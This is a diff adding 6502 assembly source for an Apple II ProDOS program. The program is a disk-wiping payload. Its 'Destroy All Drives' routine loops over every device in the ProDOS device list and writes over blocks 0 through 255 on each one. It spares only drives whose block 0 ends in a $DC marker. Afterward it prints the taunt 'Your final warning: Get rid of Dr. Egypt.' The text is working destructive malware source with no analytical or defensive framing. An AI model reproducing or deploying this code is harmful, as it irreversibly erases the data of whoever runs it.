@@ -1,0 +1,71 @@
+         org   $9E00
+         lst   OFF        ;Turns listing off
+         xc               ;Turns 65C02 on
+DEVCNT   equ   $BF31
+DEVLST   equ   $BF32
+*
+         BIT   $C082      ;Turn off 16k card
+         LDA   $F8CF
+         ORA   #$69
+         CMP   #$FD
+         BNE   ALL1
+         RTS
+GO1      STA   $4001      ;Stores slot & drive info (unit #)
+         LDA   #$03       ;Loads parameter count
+         STA   $4000      ;Stores it at first byte
+         STZ   $4002      ;Stores it at second byte
+         LDA   #$50       ;Hi byte
+         STA   $4003      ;Stores it
+*
+*  The next routine will write through blocks 0-xx
+*
+*  This first part looks at the last byte on block $00
+* to see if it's equal to $DC.  If so, it ignores that drive.
+*
+         STZ   $4004      ;Stores low byte of block ($0)
+         STZ   $4005      ;Same as above
+         JSR   $BF00      ;Jumps to MLI routine
+         hex   800040     ;Function code (read), buffer addr.
+         BCS   J6         ;Error occured, go to next step
+         LDA   $51FF      ;Loads last byte of block
+         CMP   #$DC       ;Special code to see if it's protected
+         BEQ   IGNORE     ;Ignore this drive if it's protected
+         LDX   #$FF
+J6       INX              ;Increments to next block
+         STX   $4004      ;Stores low byte of block
+         STZ   $4005      ;Hi byte of block
+         JSR   $BF00      ;Jumps to MLI routine
+         hex   810040     ;Function code, buffer address
+         BCS   IGNORE     ;An error has occured
+         CPX   BLMARK     ;Is it the last block yet?
+         BNE   J6         ;Nope, go back and do next one
+IGNORE   RTS
+********************************
+* Destroy All Drives
+********************************
+ALL1     LDA   DEVCNT
+         STA   $2000      ;Marker
+ALL2     LDA   $2000
+         BMI   SOUND1     ;All drives destroyed
+         TAY
+ALL3     LDA   DEVLST,Y   ;Get next drive info
+         JSR   GO1        ;Perform erasure
+         DEC   $2000
+         BRA   ALL2       ;Go back for next drive
+*-------------------------------
+SOUND1   LDA   #$11       ;^Q
+         JSR   $C300      ;Turn off 80 cols
+         JSR   $FC58
+         LDX   #$00
+PR       LDA   DATA,X
+HERE     BEQ   HERE
+         JSR   $FDED
+         INX
+         BRA   PR
+********************************
+*  Subroutines & Data
+********************************
+BLMARK   hex   FF
+DATA     hex   8D8D8D8D8D8D8D8D8D8D8D
+         asc   "Your final warning: Get rid of Dr. Egypt"
+         asc   "----------------------------------------",00
